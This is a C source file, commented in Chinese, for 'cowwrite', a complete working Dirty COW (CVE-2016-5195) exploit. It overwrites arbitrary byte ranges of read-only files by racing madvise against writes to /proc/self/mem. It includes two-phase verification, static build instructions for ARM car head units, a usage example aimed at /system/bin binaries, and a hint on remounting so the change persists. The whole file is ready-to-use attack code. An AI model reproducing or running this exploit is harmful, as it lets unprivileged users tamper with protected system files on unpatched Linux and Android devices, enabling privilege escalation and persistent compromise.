/* cowwrite —— Dirty COW (CVE-2016-5195) 任意写：覆盖只读文件的一段内容
 *
 * 用法
 * ----
 *     cowwrite <target> <datafile> <len> [start] [fill_byte]
 *
 *   把 datafile 的前 len 字节写到 target 的 [start, start+len)；
 *   datafile 不足 len 的部分用 fill_byte 填充（默认 0xFF ——
 *   0xFF 在 ARM 和 Thumb 两种模式下都是非法指令 UDF，适合当「毒药」）。
 *
 * 为什么分两阶段
 * --------------
 *   阶段 1  只写前 4096 字节，验证 COW 在这块文件系统上到底通不通。
 *           失败就立刻退出，不去碰大块数据。
 *   阶段 2  写完整 len 字节。
 *
 *   常见失败场景：目标在一个不能再 remount 的分区上、目标文件被别的
 *   进程以可写方式 mmap 着、或者内核已经打了补丁。阶段 1 能快速把
 *   这三种情况区分出来。
 *
 * 判据（唯一可信）
 * ----------------
 *   每阶段结束都**另开一个 fd 用 open()+read() 读回比对**。
 *   write() 返回成功是假阳性；必须独立重读。
 *
 * 对齐
 * ----
 *   mmap 的 offset 必须是页对齐的，所以真正映射的基址是 start 所在的页边界，
 *   映射内的偏移 = (start - 页边界) + 逻辑偏移。漏掉这个 delta 是经典 bug：
 *   起始地址不是 4096 的整数倍时，写会整体前移，把文件写坏。
 *
 * 编译（静态，能跑在没有 libc 的车机上）
 *   arm-linux-gnueabihf-gcc -static -O2 -pthread -o cowwrite src/cowwrite.c
 *
 * 返回值：0 成功，1 参数/IO 错误，3 阶段1 失败（不可利用），4 阶段2 失败。
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define PAGESZ   4096
#define MAX_ROUND 400

static char *g_map;          /* 映射基址（页对齐的文件偏移处）*/
static size_t g_maplen;
static size_t g_delta;       /* start 在所在页内的偏移 */
static volatile int g_stop;

static void *madv_thread(void *arg)
{
    (void)arg;
    while (!g_stop) {
        madvise(g_map, g_maplen, MADV_DONTNEED);
        sched_yield();
    }
    return NULL;
}

/* 独立 open()+read() 读回 target 的 [start, start+len) 与 want 比对。
 * 返回 1 = 一致，0 = 不一致，-1 = IO 错误。 */
static int verify(const char *path, const unsigned char *want,
                  size_t len, off_t start)
{
    unsigned char buf[65536];
    size_t got = 0;
    ssize_t n;
    int fd;

    fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;
    if (lseek(fd, start, SEEK_SET) < 0) {
        close(fd);
        return -1;
    }
    while (got < len) {
        size_t chunk = len - got;
        if (chunk > sizeof(buf))
            chunk = sizeof(buf);
        n = read(fd, buf, chunk);
        if (n <= 0) {
            close(fd);
            return -1;
        }
        if (memcmp(buf, want + got, (size_t)n) != 0) {
            close(fd);
            return 0;
        }
        got += (size_t)n;
    }
    close(fd);
    return 1;
}

/* 一轮竞态：起 madvise 线程 → 从逻辑偏移 from 写到 len → 停线程 */
static void race_round(int memfd, const unsigned char *data,
                       size_t from, size_t len)
{
    pthread_t th;
    size_t off;

    g_stop = 0;
    pthread_create(&th, NULL, madv_thread, NULL);

    for (off = from; off < len; off += PAGESZ) {
        size_t chunk = len - off;
        off_t at;

        if (chunk > PAGESZ)
            chunk = PAGESZ;
        at = (off_t)(uintptr_t)g_map + (off_t)g_delta + (off_t)off;
        if (lseek(memfd, at, SEEK_SET) < 0)
            continue;
        if (write(memfd, data + off, chunk) < 0) {
            /* 单页失败是正常的竞态结果，下一轮再来 */
        }
    }

    g_stop = 1;
    pthread_join(th, NULL);
}

int main(int argc, char **argv)
{
    const char *target, *datafile;
    unsigned char *data = NULL;
    unsigned char fill;
    struct stat st;
    size_t len;
    off_t start = 0, page_base;
    size_t probe;
    FILE *f;
    int fd, memfd, i, ok = 0;

    if (argc < 4) {
        fprintf(stderr,
                "usage: %s <target> <datafile> <len> [start] [fill_byte]\n"
                "  e.g. %s /system/bin/foo /data/local/tmp/foo.new 5328 0 255\n",
                argv[0], argv[0]);
        return 1;
    }
    target   = argv[1];
    datafile = argv[2];
    len      = (size_t)strtoul(argv[3], NULL, 0);
    if (argc > 4)
        start = (off_t)strtoll(argv[4], NULL, 0);
    fill = (argc > 5) ? (unsigned char)strtoul(argv[5], NULL, 0) : 0xFF;

    if (len == 0) {
        fprintf(stderr, "len 不能为 0\n");
        return 1;
    }
    if (start < 0) {
        fprintf(stderr, "start 不能为负\n");
        return 1;
    }

    printf("=== cowwrite ===\n");
    printf("uid=%d euid=%d\n", (int)getuid(), (int)geteuid());
    printf("target=%s\nlen=%zu start=%lld fill=0x%02x\n",
           target, len, (long long)start, fill);

    /* ---- 载入数据；不足 len 用 fill 补齐 ---- */
    f = fopen(datafile, "rb");
    if (!f) {
        perror("打开 datafile");
        return 1;
    }
    data = malloc(len);
    if (!data) {
        perror("malloc");
        fclose(f);
        return 1;
    }
    memset(data, fill, len);
    {
        size_t rd = fread(data, 1, len, f);
        printf("datafile 读入 %zu 字节，其余 %zu 字节填 0x%02x\n",
               rd, len - rd, fill);
    }
    fclose(f);

    /* ---- 只读打开目标 ---- */
    fd = open(target, O_RDONLY);
    if (fd < 0) {
        perror("打开 target");
        return 1;
    }
    if (fstat(fd, &st) < 0) {
        perror("fstat");
        return 1;
    }
    printf("target size=%lld\n", (long long)st.st_size);
    if (start + (off_t)len > st.st_size) {
        fprintf(stderr, "范围越界：start+len=%lld > size=%lld\n",
                (long long)(start + (off_t)len), (long long)st.st_size);
        return 1;
    }

    /* ---- 页对齐映射 ---- */
    page_base = start & ~(off_t)(PAGESZ - 1);
    g_delta   = (size_t)(start - page_base);
    g_maplen  = (g_delta + len + PAGESZ - 1) & ~(size_t)(PAGESZ - 1);

    g_map = mmap(NULL, g_maplen, PROT_READ, MAP_PRIVATE, fd, page_base);
    if (g_map == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    printf("mmap ok @ %p (file off 0x%llx, len 0x%zx, delta 0x%zx)\n",
           g_map, (unsigned long long)page_base, g_maplen, g_delta);

    memfd = open("/proc/self/mem", O_RDWR);
    if (memfd < 0) {
        perror("open /proc/self/mem");
        return 1;
    }

    /* ---------- 阶段 1：前 4096 字节探路 ---------- */
    probe = (len < PAGESZ) ? len : PAGESZ;
    printf("\n--- 阶段1: 探路前 %zu 字节 ---\n", probe);
    for (i = 0; i < MAX_ROUND; i++) {
        race_round(memfd, data, 0, probe);
        if (verify(target, data, probe, start) == 1) {
            ok = 1;
            break;
        }
    }
    if (!ok) {
        printf("阶段1 失败：%d 轮都没能改掉前 %zu 字节\n", MAX_ROUND, probe);
        printf("⇒ COW 在目标文件/文件系统上不可用（已打补丁 / 不允许 remount / "
               "该文件正被可写映射）\n");
        return 3;
    }
    printf("阶段1 成功（第 %d 轮）⇒ 该文件可被 COW 篡改\n", i + 1);

    if (len <= probe) {
        printf("\n全部完成（len <= 4096，无阶段2）\n");
        return 0;
    }

    /* ---------- 阶段 2：写剩余部分 ---------- */
    printf("\n--- 阶段2: 写 [%zu, %zu) ---\n", probe, len);
    ok = 0;
    for (i = 0; i < MAX_ROUND; i++) {
        race_round(memfd, data, probe, len);
        if (verify(target, data, len, start) == 1) {
            ok = 1;
            break;
        }
        if ((i % 50) == 49)
            printf("  ...第 %d 轮，仍在重试\n", i + 1);
    }

    printf("\n=== 结果 ===\n");
    if (!ok) {
        printf("✗ 阶段2 失败：只写进了前 %zu 字节\n", probe);
        return 4;
    }
    printf("★ 完整写入成功（阶段2 第 %d 轮）\n", i + 1);
    printf("最终独立 verify: %d\n", verify(target, data, len, start));
    printf("提示：改的是 page cache。要落到磁盘需要 "
           "mount -o rw,remount <分区> + sync（见 docs/03）\n");
    return 0;
}
